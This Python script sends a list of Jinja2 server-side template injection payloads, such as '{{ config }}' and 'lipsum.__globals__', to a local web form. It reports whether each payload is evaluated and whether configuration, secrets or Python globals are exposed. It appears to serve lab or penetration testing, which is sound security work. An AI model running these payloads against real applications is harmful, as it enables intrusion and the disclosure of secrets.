import requests
import sys
import time

def simple_introspection_test():
    """Test Jinja2 introspection payloads one at a time"""
    
    target_url = "http://127.0.0.1:33126/submit"
    
    payloads = [
        "{{ config }}",
        "{{ request.__dict__ }}",
        "{{ globals() }}",
        "{{ locals() }}",
        "{{ request.args }}",
        "{{ request.form }}",
        "{{ _self }}",
        "{{ lipsum.__globals__ }}",
        "{{ ''.__class__.__mro__[1].__subclasses__()[:20] }}"
    ]
    
    print("Jinja2 Template Introspection Test")
    print(f"Target: {target_url}")
    print("=" * 60)
    
    for idx, payload in enumerate(payloads, 1):
        print(f"\n[{idx}/{len(payloads)}] Testing: {payload}")
        print(f"Data: name={payload}")
        
        try:
            # Use requests directly without session
            resp = requests.post(target_url, data={'name': payload}, timeout=10)
            
            print(f"Status: {resp.status_code}")
            print(f"Response: {resp.text}")
            
            # Check if payload was evaluated
            if "{{" in resp.text and payload in resp.text:
                print("Result: Payload rendered as literal (NO SSTI)")
            else:
                print("Result: SSTI CONFIRMED - Template evaluation occurred")
                
                # Look for interesting data
                if any(word in resp.text for word in ['Config', 'SECRET', 'DEBUG', 'request', 'config']):
                    print("Data: Configuration/request data exposed")
                if any(word in resp.text for word in ['class', 'mro', 'object', 'subclass']):
                    print("Data: Python class hierarchy accessible")
                if any(word in resp.text for word in ['globals', '__builtins__', 'lipsum']):
                    print("Data: Global namespace accessible (CRITICAL)")
            
            # Rate limiting delay
            time.sleep(0.5)
            
        except Exception as e:
            print(f"Error: {str(e)}")
        
        print("-" * 60)
    
    print("\nTest completed")

if __name__ == '__main__':
    simple_introspection_test()

